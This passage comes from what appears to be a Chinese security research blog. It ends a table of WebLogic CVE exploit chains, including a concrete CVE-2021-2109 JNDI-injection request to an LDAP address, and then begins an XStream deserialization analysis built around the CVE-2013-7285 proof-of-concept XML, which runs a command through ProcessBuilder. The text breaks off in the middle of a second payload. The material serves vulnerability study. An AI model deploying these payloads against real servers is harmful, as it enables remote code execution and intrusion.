<td>T3协议反序列化漏洞造成XXE。分别使用到了绕过黑名的类ForeignRecoveryContext、WsrmServerPayloadContext、UnknownMsgHeader、WsrmSequenceContext、EJBTaglibDescriptor。而且都是调用readExternal作为入口点。</td>
</tr>
<tr>
<td>CVE-2019-2725</td>
<td>XMLDecoder反序列化漏洞</td>
<td>反序列化UnitOfWorkChangeSet类，在其构造函数中，使用第一个方法第一参数字节数组作为源，创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用该特性绕过黑名单，反序列化任意类。</td>
</tr>
<tr>
<td>CVE-2019-2729</td>
<td>XMLDecoder反序列化漏洞</td>
<td>被封禁的class标签替换成array标签，同时还带上一个method属性。只在JDK6生效。</td>
</tr>
<tr>
<td>CVE-2019-2827</td>
<td>目录穿越漏洞</td>
<td>使用两个点的<code>..</code>绕过CVE-2019-2618文件上传对于目录穿越修复的绕过。</td>
</tr>
<tr>
<td>CVE-2019-2890</td>
<td>T3协议反序列化漏洞</td>
<td>在PersistentContext的readSubject，会创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用这个特性绕过黑名单，反序列化任意类。</td>
</tr>
<tr>
<td>CVE-2020-2551</td>
<td>IIOP协议反序列化漏洞</td>
<td>反序列化JtaTransactionManager造成JNDI注入。</td>
</tr>
<tr>
<td>CVE-2020-2555</td>
<td>T3协议反序列化漏洞</td>
<td>使用ReflectionExtractor的extract反射调用任意类的任意方法。</td>
</tr>
<tr>
<td>CVE-2020-2883</td>
<td>T3协议反序列化漏洞</td>
<td>改变链的中间部分，使用ReflectionExtractor的extract反射调用任意类的任意方法。</td>
</tr>
<tr>
<td>CVE-2020-2963</td>
<td>T3协议反序列化漏洞</td>
<td>在SOAPInvokeState的readExternal，会创建一个原生的没有黑名单的ObjectInputStream，同时基于该流再读取对象。利用这个特性绕过黑名单，反序列化任意类。</td>
</tr>
<tr>
<td>CVE-2020-14644</td>
<td>IIOP协议反序列化漏洞</td>
<td>在调用RemoteConstructor的readResolve后，会经历如下流程：获取RemoteConstructor的m_definition属性（ClassDefinition），再获取ClassDefinition的m_abClass字节数组，转换成类，找到类中的构造函数，再赋值给ClassDefinition的m_mhCtor属性，最后获取该属性，执行该构造函数，触发恶意操作。</td>
</tr>
<tr>
<td>CVE-2020-14645</td>
<td>T3协议反序列化漏洞</td>
<td>通过UniversalExtractor能反射执行任意类的getter方法的特性，触发JdbcRowSetImpl.getDatabaseMetaData()造成JNDI注入。</td>
</tr>
<tr>
<td>CVE-2020-14750</td>
<td>未授权访问漏洞</td>
<td>使用双重URL编码绕过认证直接访问后台。二级目录为&#x2F;images。</td>
</tr>
<tr>
<td>CVE-2020-14756</td>
<td>T3协议反序列化漏洞</td>
<td>AttributeHolder.readExternal()作为入口点，最后使用MVEL.executeExpression()执行表达式。</td>
</tr>
<tr>
<td>CVE-2020-14825&#x2F;CVE-2020-14841</td>
<td>T3协议反序列化漏洞</td>
<td>利用LockVersionExtractor类能反射执行任意类的getter方法和setter方法的特性，触发JdbcRowSetImpl.getDatabaseMetaData()造成JNDI注入。</td>
</tr>
<tr>
<td>CVE-2020-14882</td>
<td>未授权访问漏洞</td>
<td>使用双重URL编码绕过认证直接访问后台。二级目录为&#x2F;css。</td>
</tr>
<tr>
<td>CVE-2020-14883</td>
<td>任意命令执行漏洞</td>
<td>指定handle参数的值为ShellSession，直接执行命令。</td>
</tr>
<tr>
<td>CVE-2021-2109</td>
<td>JNDI注入漏洞</td>
<td>指定URI为&#x2F;console&#x2F;css&#x2F;%252e%252e%252f&#x2F;consolejndi.portal，请求体的键JNDIBindingPortlethandle的值为com.bea.console.handles.JndiBindingHandle(%22ldap:&#x2F;&#x2F;192.168.176;1:1389&#x2F;ikun;AdminServer%22)即可直接造成JNDI注入。</td>
</tr>
<tr>
<td>CVE-2021-2135</td>
<td>T3协议反序列化漏洞</td>
<td>AttributeHolder.readExternal()作为入口点，中间的链进行了改造，最后使用MVEL.executeExpression()执行表达式。</td>
</tr>
<tr>
<td>CVE-2021-2294</td>
<td>T3协议反序列化漏洞</td>
<td>OraclePooledConnection的readObject往可控地址发送JDBC请求。</td>
</tr>
<tr>
<td>CVE-2021-2394</td>
<td>T3协议反序列化漏洞</td>
<td>使用AttributeHolder.readExternal()作为入口点，利用FilterExtractor类能反射执行任意类的getter方法的特性，触发JdbcRowSetImpl.getDatabaseMetaData()造成JNDI注入。</td>
</tr>
<tr>
<td>CVE-2022-21350</td>
<td>IIOP协议反序列化漏洞</td>
<td>BadAttributeValueExpException-&gt;SessionData-&gt;AttributeWrapperUtils-&gt;BusinessHandleImpl-&gt;HomeHandleImpl最终造成JNDI注入。</td>
</tr>
<tr>
<td>CVE-2023-21839</td>
<td>JNDI注入漏洞</td>
<td>先rebind一个ForeignOpaqueReference，再lookup造成JNDI注入。</td>
</tr>
<tr>
<td>CVE-2023-21931</td>
<td>JNDI注入漏洞</td>
<td>先rebind一个LinkRef，再lookup造成JNDI注入。</td>
</tr>
</tbody></table>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://paper.seebug.org/1012/">WebLogic 安全研究报告</a></li>
<li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</a></li>
<li><a href="https://www.modb.pro/db/55882">中间件基本概念（weblogic）</a></li>
<li><a href="http://tttang.com/archive/1768/#toc__6">Weblogic Analysis Attacked by T3 Protocol From CVE (part 1)</a></li>
<li><a href="https://www.cnblogs.com/my-first-blog-lgz/p/14452839.html">weblogic补丁下载与安装补丁的方法</a></li>
<li><a href="https://blog.csdn.net/yangkei/article/details/128301721">WebLogic优化（10.3.6）</a></li>
<li><a href="https://www.anquanke.com/post/id/250801#h2-1">忆——Weblogic CVE-2016-0638反序列化漏洞</a></li>
<li><a href="https://forum.butian.net/share/1191">weblogic反序列化漏洞合集</a></li>
<li><a href="https://www.anquanke.com/post/id/199227">Java CORBA</a></li>
<li><a href="https://paper.seebug.org/1138">WebLogic CVE-2020-2551漏洞分析</a></li>
<li><a href="https://xz.aliyun.com/t/7498">手把手教你解决Weblogic CVE-2020-2551 POC网络问题</a></li>
<li><a href="https://paper.seebug.org/1395/">Weblogic 未授权命令执行分析复现（CVE-2020-14882&#x2F;14883）</a> </li>
<li><a href="https://xz.aliyun.com/t/9068">How Did I Find Weblogic T3 RCE</a></li>
<li><a href="https://blog.51cto.com/hbxztc/1911276">Oracle打Patch报错Prerequisite check “CheckActiveFilesAndExecutables” failed.</a></li>
<li><a href="https://xz.aliyun.com/t/11087">Weblogic T3协议白名单绕过方法探索</a></li>
<li><a href="https://xz.aliyun.com/t/11825#toc-4">Weblogic CVE-2020-2551 绕过NAT网络分析</a></li>
<li><a href="https://blog.csdn.net/shiwodecuo/article/details/84656730">如何修改源码&gt;重新打包&gt;替换源文件</a></li>
<li><a href="https://www.r4v3zn.com/posts/144eb4b6/">Weblogic IIOP 协议NAT 网络绕过</a></li>
</ul>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>XStream漏洞全系分析(截至2023/4/15)</title>
    <url>/2023/04/15/XStream/</url>
    <content><![CDATA[<h1 id="XStream漏洞全系分析-截至2023-x2F-4-x2F-15"><a href="#XStream漏洞全系分析-截至2023-x2F-4-x2F-15" class="headerlink" title="XStream漏洞全系分析(截至2023&#x2F;4&#x2F;15)"></a>XStream漏洞全系分析(截至2023&#x2F;4&#x2F;15)</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XStream主要用来将 Java 对象转换为 XML，以及将 XML 转换为 Java 对象。</p>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>pom文件中导入xstream库：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.11.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>先编写一个Student：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    ...<span class="comment">//省略setter和getter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再写一个main方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.setAge(<span class="number">81</span>);</span><br><span class="line">        student.setId(<span class="string">&quot;13&quot;</span>);</span><br><span class="line">        student.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line"></span><br><span class="line">        xStream.alias(<span class="string">&quot;student&quot;</span>, Student.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(student);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304061549581.png" alt="image-20230406154957549"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xStream.alias(<span class="string">&quot;student&quot;</span>, Student.class);</span><br></pre></td></tr></table></figure>

<p>这句话为类起别名，不写这句话，输出为：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304061551616.png" alt="image-20230406155122581"></p>
<p>输出类名时会带上包名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XStream xStream = new XStream();</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304061619881.png" alt="image-20230406161945844"></p>
<p>调用带三个参数的构造函数，这里new XppDriver()作为第三个参数。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304061624908.png" alt="image-20230406162422845"></p>
<p>第三个参数为HierarchicalStreamDriver接口，该接口为 XStream 提供流解析器和编写器的实现。</p>
<p>HierarchicalStreamDrive为XStream提供XML解析器（HierarchicalStreamReader）和写入器（HierarchicalStreamWriter）的实现。</p>
<p>XStream默认使用了XppDriver解析器，Xpp其实就是XML Pull Parser，也就是使用PULL方式解析XML。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CyberIKUN/picture@main/img/image-20220902115246855.png" alt="image-20220902115246855"></p>
<p>XppReader为XStream读取器，使用XmlPullParser API直接从流中提取。XML解析有三种方式：DOM解析、SAX解析（PULL解析与原理相同）、JDOM 解析、DOM4J 解析，这里使用的PULL解析。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CyberIKUN/picture@main/img/image-20220902121505898.png" alt="image-20220902121505898"></p>
<p>ConverterLookup为特定类型寻找转换器实现：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304062315401.png" alt="image-20230406231538356"></p>
<p>存在一个方法：</p>
<ul>
<li><code>Converter lookupConverterForType(Class type);</code>：根据指定的类型返回对应的转换器；</li>
</ul>
<p>Converter转换器接口的实现可以将java对象转换成文本，或者将文本转换成java对象。</p>
<img src="https://cdn.jsdelivr.net/gh/CyberIKUN/picture@main/img/image-20220902113248528.png" alt="image-20220902113248528" style="zoom: 67%;" />

<p>XStream类里存在两个方法：</p>
<ul>
<li><code>void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context);</code>：将对象转换成文本</li>
<li><code>Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context);</code>：将文本转换成对象</li>
</ul>
<h3 id="XStream设计"><a href="#XStream设计" class="headerlink" title="XStream设计"></a>XStream设计</h3><p>XStream 总体由五部分组成</p>
<ul>
<li><strong>XStream</strong> 作为客户端对外提供XML解析与转换的相关方法。</li>
<li><strong>AbstractDriver</strong> 为XStream提供流解析器和编写器的创建。目前支持XML（DOM，PULL）、JSON解析器。解析器<strong>HierarchicalStreamReader</strong>，编写器<strong>HierarchicalStreamWriter</strong>（PS：<strong>XStream</strong>默认使用了<strong>XppDriver</strong>）。</li>
<li><strong>MarshallingStrategy</strong> 编组和解组策略的核心接口，两个方法：<br> marshal：编组对象图<br> unmarshal：解组对象图<br> <strong>TreeUnmarshaller</strong> 树解组程序，调用mapper和Converter把XML转化成java对象，里面的start方法开始解组，convertAnother方法把class转化成java对象。<br> <strong>TreeMarshaller</strong> 树编组程序，调用mapper和Converter把java对象转化成XML，里面的start方法开始编组，convertAnother方法把java对象转化成XML。<br> 它的抽象子类<strong>AbstractTreeMarshallingStrategy</strong>有抽象两个方法<br> createUnmarshallingContext<br> createMarshallingContext<br> 用来根据不同的场景创建不同的<strong>TreeUnmarshaller</strong>子类和<strong>TreeMarshaller</strong>子类，使用了<strong>策略模式</strong>，如ReferenceByXPathMarshallingStrategy创建ReferenceByXPathUnmarshaller，ReferenceByIdMarshallingStrategy创建ReferenceByIdUnmarshaller（PS：<strong>XStream</strong>默认使用<strong>ReferenceByXPathMarshallingStrategy</strong>）。</li>
<li><strong>Mapper</strong> 映射器，XML的elementName通过mapper获取对应类、成员、属性的class对象。支持解组和编组，所以方法是成对存在real和serialized，他的子类<strong>MapperWrapper</strong>作为装饰者，包装了不同类型映射的映射器，如AnnotationMapper，ImplicitCollectionMapper，ClassAliasingMapper。</li>
<li><strong>ConverterLookup</strong> 通过Mapper获取的Class对象后，接着调用lookupConverterForType获取对应Class的转换器，将其转化成对应实例对象。<strong>DefaultConverterLookup</strong>是该接口的实现类，同时实现了<strong>ConverterRegistry</strong>的接口，所有<strong>DefaultConverterLookup</strong>具备查找converter功能和注册converter功能。所有注册的转换器按一定优先级组成由<strong>TreeSet</strong>保存的有序集合(PS:<strong>XStream</strong> 默认使用了<strong>DefaultConverterLookup</strong>)。</li>
</ul>
<blockquote>
<p>从其他博主偷的XStream设计图~~</p>
</blockquote>
<img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304062325336.png">

<blockquote>
<p>这里再提一嘴策略模式，同样也是引用其他文章~~</p>
</blockquote>
<p>策略模式的主要角色如下：</p>
<ul>
<li>抽象策略（Strategy）类：这是一个抽象角色，通常由一个接口或抽象类实现。此角色给出所有的具体策略类所需的接口。</li>
<li>具体策略（Concrete Strategy）类：实现了抽象策略定义的接口，提供具体的算法实现或行为。</li>
<li>环境（Context）类：持有一个策略类的引用，最终给客户端调用。</li>
</ul>
<p>【例】促销活动</p>
<p>一家百货公司在定年度的促销活动。针对不同的节日（春节、中秋节、圣诞节）推出不同的促销活动，由促销员将促销活动展示给客户。类图如下：</p>
<img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F.png" style="zoom:80%;" />

<p>代码如下：</p>
<p>定义百货公司所有促销活动的共同接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义具体策略角色（Concrete Strategy）：每个节日具体的促销活动</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//为春节准备的促销活动A</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StrategyA</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;买一送一&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为中秋准备的促销活动B</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StrategyB</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;满200元减50元&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为圣诞准备的促销活动C</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StrategyC</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;满1000元加一元换购任意200元以下商品&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义环境角色（Context）：用于连接上下文，即把促销活动推销给客户，这里可以理解为销售员</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SalesMan</span> &#123;                        </span><br><span class="line">    <span class="comment">//持有抽象策略角色的引用                              </span></span><br><span class="line">    <span class="keyword">private</span> Strategy strategy;                 </span><br><span class="line">                                               </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SalesMan</span><span class="params">(Strategy strategy)</span> &#123;       </span><br><span class="line">        <span class="built_in">this</span>.strategy = strategy;              </span><br><span class="line">    &#125;                                          </span><br><span class="line">                                               </span><br><span class="line">    <span class="comment">//向客户展示促销活动                                </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">salesManShow</span><span class="params">()</span>&#123;                </span><br><span class="line">        strategy.show();                       </span><br><span class="line">    &#125;                                          </span><br><span class="line">&#125;                                              </span><br></pre></td></tr></table></figure>

<p>这样的优点是：</p>
<ul>
<li>抽象出一个接口（Strategy），方便后续增添新的策略实现类；</li>
<li>隐藏具体策略实现；</li>
<li>仅需通过环境角色选择具体的策略进行调用，方便操作；</li>
</ul>
<ul>
<li>多个策略只区别在表现行为不同，可以使用策略模式，在运行时动态选择具体要执行的行为；</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实XStream设计上比以往分析过的其他组件简单明了许多，也比较容易理解。最骚的也是他的官网会存放所有漏洞以及POC和说明，对于分析来说方便很多。</p>
<h2 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h2><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.6 and XStream &#x3D; 1.4.10</li>
</ul>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>poc：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>前面说过<code>TreeUnmarshaller</code>类负责将xml转成java对象，里面的start方法开始反序列化，所以直接在start方法下断点：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072100690.png" alt="image-20230407210017645"></p>
<p>通过<code> HierarchicalStreams.readClassType(reader, mapper);</code>读取类型信息，然后根据标签名找到对应类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072102548.png" alt="image-20230407210226507"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072106604.png" alt="image-20230407210633557"></p>
<p>然后调用convertAnother方法进行类的实例化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072108374.png" alt="image-20230407210817332"></p>
<p>然后找到该接口的默认实现类，为TreeSet：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072110606.png" alt="image-20230407211016554"></p>
<p>然后寻找converter（TreeSetConverter）进行convert：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072111575.png" alt="image-20230407211115533"></p>
<p>在convert方法里：</p>
<p>其实就是调用父类的convert方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072114452.png" alt="image-20230407211430386"></p>
<p>在父类的convert方法里，将实现类压栈types中，然后调用converter.unmarshal(reader, this);进行反序列化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072115381.png" alt="image-20230407211543331"></p>
<p>在converter.unmarshal(reader, this);方法中，继续treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);解析类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072122424.png" alt="image-20230407212224348"></p>
<p>在treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);方法中，使用putCurrentEntryIntoMap(reader, context, result, sortedMap);读取下一个标签（dynamic-proxy）对应的类，放到sortedMap中，进到putCurrentEntryIntoMap方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072124923.png" alt="image-20230407212454754"></p>
<p>再进入readItem查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072135250.png" alt="image-20230407213513214"></p>
<p>调用HierarchicalStreams.readClassType(reader, mapper());读取下一个标签对应的类（Proxy$xxx），进入readClassType方法中查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072137621.png" alt="image-20230407213734583"></p>
<p>中间经过一些类，然后来到MapperWrapper#realClass方法中获取dynamic-proxy标签对应的类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072136465.png" alt="image-20230407213628405"></p>
<p>回到readItem方法中，然后使用convertAnother进行实例化该类并返回：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072138363.png" alt="image-20230407213801322"></p>
<p>再返回上级putCurrentEntryIntoMap方法中，然后将实例化的类（Proxy$xxx）存入target中，target就是sortedMap：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072235090.png" alt="image-20230407223522052"></p>
<p>动态代理用来代理一个或多个接口，需要提供一个InvocationHandler的实现类，当执行动态代理的类的任何方法时都会执行InvocationHandler的invoke方法。</p>
<p>在xml标签中，我们设置要实现的接口为Comparable，InvocationHandler的实现类为EventHandler类。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072227250.png" alt="image-20230407222758197"></p>
<p>然后又为他的target和action属性分别赋值为java.lang.ProcessBuilder和start。在XStream中，他会使用反射对属性进行赋值而不是setter、getter和构造函数（上面的图只是看看属性）。</p>
<p>回到TreeMapConverter#populateTreeMap方法中，在putCurrentEntryIntoMap调用完后，使用新创建的TreeMap的putAll方法，会将刚刚创建好的sortedMap放入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072156267.png" alt="image-20230407215608190"></p>
<p>在putAll方法中，调用父类的putAll方法（继续将sortedMap传递）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072157789.png" alt="image-20230407215733752"></p>
<p>父类为AbstractMap，其putAll方法中又调用了put方法，这里他会从Map循环获取键和值，而这里的Map就是sortedMap，从sortedMap中取出键和值，键和值就是我们读取出来的动态代理对象：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072203903.png" alt="image-20230407220310859"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072206425.png" alt="image-20230407220610357"></p>
<p>这里使用了模板方法模式，父类AbstractMap没有实现put方法，由TreeMap提供实现：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072158719.png" alt="image-20230407215852663"></p>
<p>在TreeMap中调用compare方法进行值的比较：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072159571.png" alt="image-20230407215950498"></p>
<p>而在compare方法里，调用了动态代理类的compareTo方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072207652.png" alt="image-20230407220740596"></p>
<p>之前说过，执行动态代理类的任何方法都会被InvocationHandler的实现类拦截，这里InvocationHandler的实现类就是我们包装的EventHandler，此时他会执行EventHandler的invoke方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072209971.png" alt="image-20230407220949920"></p>
<p>他会调用自身的invokeInternal方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072213740.png" alt="image-20230407221324671"></p>
<p>根据封装的target和action，找到action方法，也就是我们封装好的ProcessBuilder#start方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072214146.png" alt="image-20230407221454058"></p>
<p>然后就是执行该ProcessBuilder#start方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072217536.png" alt="image-20230407221706472"></p>
<p>触发命令执行。</p>
<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>整个流程下来还算简单，在TreeMapConverter#populateTreeMap方法中：</p>
<p>将TreeMap在xml中的第一个子标签读取出来并实例化为类，将类的实例作为key和value存放在sortedMap中，然后调用TreeMap的putAll方法，将sortedMap中元素提取出来放到TreeMap中，由于TreeMap会调用compare方法将key进行比对，比对的时候由于自身的comparator（比较器）为null，无法使用自身的comparator（比较器）去比较两个key，那么只能将key强转为Comparable类型，并调用key的compareTo方法。</p>
<p>正就是因为调用了key的compareTo方法，key为代理对象，他交给EventHandler的invoke方法处理。</p>
<p>在EventHandler的invoke方法会调用invokeInternal方法，在invokeInternal方法中，从自身的属性target中寻找action方法并执行。我们将target赋值为<code>ProcessBuilder</code>，将action赋值为<code>start</code>就完成了命令执行的操作。</p>
<h3 id="额外"><a href="#额外" class="headerlink" title="额外"></a>额外</h3><p>在网上看到另一个POC：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 